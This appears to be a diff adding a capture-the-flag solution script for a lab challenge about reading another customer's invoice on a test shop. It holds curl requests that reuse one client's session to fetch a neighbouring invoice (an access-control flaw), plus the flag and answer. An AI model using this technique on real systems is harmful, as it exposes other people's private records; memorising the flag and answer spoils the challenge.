@@ -1,0 +1,5 @@
+# Challenge "The invoice next door": the shortest path, replayed by CI in every language.
+curl -b "session=pg-client-2031" https://boutique.polygone.test/api/factures/2031
+curl -b "session=pg-client-2031" https://boutique.polygone.test/api/factures/2030
+submit FLAG{polygone-facture-voisine-5e1b}
+answer owner
